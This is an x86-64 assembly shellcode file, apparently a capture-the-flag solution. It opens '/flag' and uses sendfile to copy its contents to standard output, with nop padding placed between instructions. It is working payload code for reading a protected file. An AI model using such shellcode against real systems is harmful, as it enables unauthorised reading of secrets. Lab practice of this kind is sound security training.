.global _start
_start:
.intel_syntax noprefix

# open("/flag", 0) // 0 is O_RDONLY
nop
mov rsi, 0

nop
lea rdi, [rip+flag] # This instruction should not move, otherwise it cannot get the exact address of flag.

nop
nop
nop
xor rax, rax
add al, 2

nop
nop
nop
nop
nop
nop
syscall


# sendfile(1, 0, 0, 0x80);
xor rax, rax
mov al, 40
nop
nop
nop

xor rdi, rdi
inc rdi
nop
nop

xor rsi, rsi
nop
nop
nop
nop
nop

xor rdx, rdx
nop
nop
nop
nop
nop

mov r10, 0x80
nop

syscall
nop
nop
nop
nop
nop
nop

flag:
.asciz "/flag"
